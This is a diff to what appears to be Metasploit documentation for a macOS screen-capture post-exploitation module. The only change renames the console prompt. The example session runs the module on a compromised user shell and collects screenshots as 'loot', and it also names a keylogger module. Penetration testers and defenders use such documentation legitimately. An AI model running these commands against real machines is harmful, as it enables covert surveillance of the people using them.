@@ -33,16 +33,16 @@ This module takes screenshots of target desktop and automatically downloads them
 ### User level shell on OSX 10.14.4
 
 ```
-msf5 post(osx/capture/keylog_recorder) > use post/osx/capture/screen 
-msf5 post(osx/capture/screen) > set session 1
+msf post(osx/capture/keylog_recorder) > use post/osx/capture/screen 
+msf post(osx/capture/screen) > set session 1
 session => 1
-msf5 post(osx/capture/screen) > run
+msf post(osx/capture/screen) > run
 
 [*] Capturing 1 screenshots with a delay of 10 seconds
 [*] Screen Capturing Complete
 [*] Use "loot -t screen_capture.screenshot" to see file locations of your newly acquired loot
 [*] Post module execution completed
-msf5 post(osx/capture/screen) > loot -t screen_capture.screenshot
+msf post(osx/capture/screen) > loot -t screen_capture.screenshot
 
 Loot
 ====
